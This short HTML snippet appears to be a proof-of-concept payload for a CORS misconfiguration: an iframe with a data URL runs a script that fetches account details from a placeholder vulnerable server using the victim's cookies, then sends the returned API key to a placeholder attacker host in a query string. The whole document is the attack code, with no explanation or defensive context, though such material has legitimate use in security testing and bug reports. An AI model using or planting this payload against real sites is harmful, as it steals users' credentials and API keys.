<iframe src="data:text/html,
<script>
vulserver = 'https://vulsever/accountDetails'
attacker = 'https://attacker/exploit'

document.onload = fetch(vulserver, {
  credentials: 'include'  
}) .then(response => response.json()).then(data=>{fetch(attacker+'/expoit?key='+data.apikey)})




</script>">
</iframe>